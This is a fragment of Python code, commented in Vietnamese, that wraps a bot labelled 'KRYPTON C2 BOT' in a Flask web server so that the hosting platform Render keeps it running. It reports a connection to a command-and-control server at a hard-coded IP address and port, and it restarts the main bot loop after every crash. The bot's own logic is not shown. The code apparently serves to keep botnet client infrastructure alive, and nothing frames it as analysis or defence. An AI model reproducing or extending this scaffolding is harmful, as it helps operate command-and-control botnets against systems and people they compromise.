...
# ========== PHẦN WEB SERVER CHO RENDER (THÊM VÀO ĐẦU FILE) ==========
from flask import Flask
import multiprocessing

def run_web_server():
    """Web server riêng để Render không báo lỗi"""
    app = Flask(__name__)
    
    @app.route('/')
    def home():
        return "✅ Bot is connected to C2"
    ...
    def status():
        return {
            "status": "active",
            "c2_server": "103.149.253.218:5511",
            "uptime": time.ctime()
        }
    ...
    # Chạy Flask với Waitress (ổn định hơn)
...
# ========== MAIN ENTRY POINT (THÊM VÀO CUỐI FILE) ==========
if __name__ == '__main__':
    print("=" * 60)
    print("🤖 KRYPTON C2 BOT WITH WEB INTERFACE")
    print("=" * 60)
    ...
    # Start main bot (with restart on crash)
    while True:
        try:
            main()
